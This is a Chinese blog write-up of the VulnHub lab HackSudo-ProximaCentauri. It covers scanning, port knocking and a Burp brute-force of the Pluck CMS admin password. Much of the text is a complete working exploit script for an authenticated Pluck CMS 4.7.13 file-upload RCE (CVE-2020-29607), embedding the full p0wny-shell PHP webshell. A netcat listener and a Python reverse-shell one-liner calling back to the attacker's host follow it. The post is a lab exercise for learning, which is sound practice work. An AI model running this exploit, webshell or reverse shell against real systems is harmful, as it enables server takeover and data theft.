@@ -1,0 +1,434 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/WU8CQREzwsGqIfBpxwTrAw)
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 25篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/ZSH4VlHv0wUiapfR49hWa2eYqkEGbXzkuQ59LbkL2CvAM8l6ZgoEquXibP2LqGdBhxIemS84Jl7iaVqDK9CJXVdCw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/yy4ERibNaTfR1a65O0rmnQbpic6doaYJJDItNsfQWUBHsSJxn4TiaWOOnaB9CBdo2L7YUk8g2UpelUrQORCeDHHbw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
+
+**声明：**文章来自作者日常学习笔记，请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。仅供学习研究
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/h6R0sRed4WF1Y7qVdRo7SibsRyCm88BjClJeIRVfaBH4LP84hq6VjWz5JKiadnZcuqTUwCVcHoSHlWr6o4X24Oxg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/HIvUXxmO2Igh1vy0Tiayxpn8jT7aGK2bPrl3vib0GUP2bnEpNQz2HB37ic3E1HX3mNjyDOqAP15IHgGibZZxtib5VhA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)
+
+  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://www.vulnhub.com/entry/hacksudo-proximacentauri,709/
+```
+
+靶场: VulnHub.com
+
+靶机名称: HackSudo-ProximaCentauri
+
+难度: 简单
+
+发布时间: 2021年6月8日
+
+提示信息:
+
+```
+这个盒子是为了提高Linux特权升级和CMS技能而创建的，我希望你们喜欢。
+```
+
+目标: flag1.txt、user.txt、root.txt
+
+  
+
+实验环境
+----
+
+```
+`攻击机:VMwarekali192.168.7.4``靶机:VboxlinuxIP自动获取`
+```
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址
+
+```
+工具:Advanced Port Scaner
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为192.168.7.151
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 192.168.7.151 -oN ProximaCentauri.nmap
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到开放22和80端口，22端口有防火墙隔离了，先看看80端口
+
+Web渗透
+-----
+
+访问80端口
+
+```
+http://192.168.7.151
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后跳转到一个看着像文件包含的url，先做个目录扫描再继续
+
+### 目录扫描
+
+```
+gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://192.168.7.151 -x php,html,txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+有个flag先下载下来看看
+
+```
+wget http://192.168.7.151/flag1.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  
+
+没什么用，再看看admin.php
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后跳转到登录页面，但是我们看到了程序的名称和版本 pluck 4.7.13，我们去exploit-db查询是否有漏洞
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+找到一个文件上传远程代码执行漏洞，下载下来
+
+```
+`# Exploit Title: Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated)``# Date: 25.05.2021``# Exploit Author: Ron Jost (Hacker5preme)``# Vendor Homepage: https://github.com/pluck-cms/pluck``# Software Link: https://github.com/pluck-cms/pluck/releases/tag/4.7.13``# Version: 4.7.13``# Tested on Xubuntu 20.04``# CVE: CVE-2020-29607``'''``Description:``A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin``privileged user to gain access in the host through the "manage files" functionality,``which may result in remote code execution.``'''``'''``Import required modules:``'''``import sys``import requests``import json``import time``import urllib.parse``'''``User Input:``'''``target_ip = sys.argv[1]``target_port = sys.argv[2]``password = sys.argv[3]``pluckcmspath = sys.argv[4]``'''``Get cookie``'''``session = requests.Session()``link = 'http://' + target_ip + ':' + target_port + pluckcmspath``response = session.get(link)``cookies_session = session.cookies.get_dict()``cookie = json.dumps(cookies_session)``cookie = cookie.replace('"}','')``cookie = cookie.replace('{"', '')``cookie = cookie.replace('"', '')``cookie = cookie.replace(" ", '')``cookie = cookie.replace(":", '=')``'''``Authentication:``'''``# Compute Content-Length:``base_content_len = 27``password_encoded = urllib.parse.quote(password, safe='')``password_encoded_len = len(password_encoded.encode('utf-8'))``content_len = base_content_len + password_encoded_len``# Construct Header:``header = {` `'Host': target_ip,` `'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',` `'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',` `'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',` `'Accept-Encoding': 'gzip, deflate',` `'Content-Type': 'application/x-www-form-urlencoded',` `'Content-Length': str(content_len),` `'Origin': 'http://' + target_ip,` `'Connection': 'close',` `'Referer': 'http://' + target_ip + pluckcmspath + '/login.php',` `'Cookie': cookie,` `'Upgrade-Insecure-Requests': '1'``}``# Construct Data:``body = {` `'cont1': password,` `'bogus': '',` `'submit': 'Log in',``}``# Authenticating:``link_auth = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/login.php'``auth = requests.post(link_auth, headers=header, data=body)``print('')``if 'error' in auth.text:` `print('Password incorrect, please try again:')` `exit()``else:` `print('Authentification was succesfull, uploading webshell')` `print('')``'''``Upload Webshell:``'''``# Construct Header:``header = {` `'Host': target_ip,` `'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',` `'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',` `'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',` `'Accept-Encoding': 'gzip, deflate',` `'Content-Type': 'multipart/form-data; boundary=---------------------------5170699732428994785525662060',` `'Connection': 'close',` `'Referer': 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files',` `'Cookie': cookie,` `'Upgrade-Insecure-Requests': '1'``}``# Constructing Webshell payload: I'm using p0wny-shell: https://github.com/flozz/p0wny-shell```data = "-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"filefile\"; filename=\"shell.phar\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&\")\n                    .replace(/</g, \"<\")\n                    .replace(/>/g, \">\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"```# Uploading Webshell:``link_upload = 'http://' + target_ip + ':' + target_port + pluckcmspath + '/admin.php?action=files'``upload = requests.post(link_upload, headers=header, data=data)``'''``Finish:``'''``print('Uploaded Webshell to: http://' + target_ip + ':' + target_port + pluckcmspath + '/files/shell.phar')``print('')`
+```
+
+保存为exp.py测试后发现这个洞需要管理员密码才可以，再找找从哪里可以搞到密码吧
+
+在/planet/目录下发现travel目录，打开后是一个页面
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+似乎在加载什么东西，看下源码
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+有段注释，提到坐标RA是打开，Dec是关闭，还有一个链接https://g.co/kgs/F9Lb6b需要科学上网才能访问
+
+打开页面后是搜索页面搜索内容是半人马座近邻的相关内容
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+之前的注释中提到坐标，我们搜索下（输入coordinate找了半天没结果，最后看到搜索结果是有提示我我要找的是coordinates，英文差很耽误事啊）
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+好了，现在拿到哪的RA值了，RA代表开放Dec代表关闭，而且有3个值，这里就要靠经验了因为需要用到端口碰撞技术Port Knocking
+
+### 端口碰撞
+
+简介：
+
+端口碰撞是一种**通过在一组预先指定的关闭端口上产生连接请求，从外部打开防火墙上的端口的方法**。一旦收到正确的连接请求序列，防火墙规则就会被动态修改，以允许发送连接请求的主机通过**特定端口**进行连接。
+
+端口碰撞的主要目的是防止攻击者通过进行端口扫描来扫描系统中潜在的可利用服务，因为除非攻击者发送正确的碰撞序列，否则受保护的端口将显示为关闭。
+
+举例：
+
+服务器上的22端口上做了端口碰撞设置，用户需要知道规则，并且按顺序进行端口碰撞才能访问指定的端口，比如服务器设置2048、1024、4096、8192四个端口，用户就需要按这个顺序，先连接2048、再连接1024、再连接4096、再连接8192，这时22端口就开放了，当用户连接到22端口，当断开连接后22端口自动关闭
+
+### 工具knock
+
+话不多说，我们来试试是否正确,先安装knock
+
+```
+sudo apt install knockd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+使用方法
+
+```
+knock <IP> <PORT1> <PORT2> <PORT3> <PORT4> -v
+```
+
+这里RA有3个值14、29、43 ，我们用这三个端口试试
+
+```
+knock 192.168.7.151 14 29 43 -v
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+让我们来连接ssh试试
+
+```
+ssh 192.168.7.151
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以访问22端口了，我们还没有密码，但是这个登录界面有很多信息，有段提示信息和一个链接，现看看链接是什么
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+有提示密码，这应该是个字典，复制下来拿来暴破，这里没有帐号那就去暴破pluck后台
+
+### BurpSuite
+
+打开BurpSuite，浏览器打开代理
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+在登录页面随便输入个内容提交，进行抓包
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+BurpSuite拦截到发包，将其发送到Intruder模块
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+设置载荷位置
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+Payload中载入字典然后点开始攻击
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到密码了(hacktheplanet)，关掉代理登录试试
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+登录成功，现在可以用我们的exp了,这里要4个参数，IP、端口、密码、CMS路径，CMS是在网站根目录下所以用两个单引号补位
+
+```
+python3 exp.py 192.168.7.151 80 hacktheplanet ''
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+webshell上传成功，我们去访问一下
+
+```
+http://192.168.7.151/files/shell.phar
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+看一下登录权限
+
+```
+cat /etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+3个帐号可以登录 proxima、alfa、centauri，再找找其他信息
+
+### 反弹shell
+
+这个webshell不太好用，让我先反弹到kali上再操作
+
+kali攻击机监听4444端口
+
+```
+nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+webshell上执行反弹payload
+
+```
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.7.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，切换到交互shell
+
+```
+`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键`
+```
+
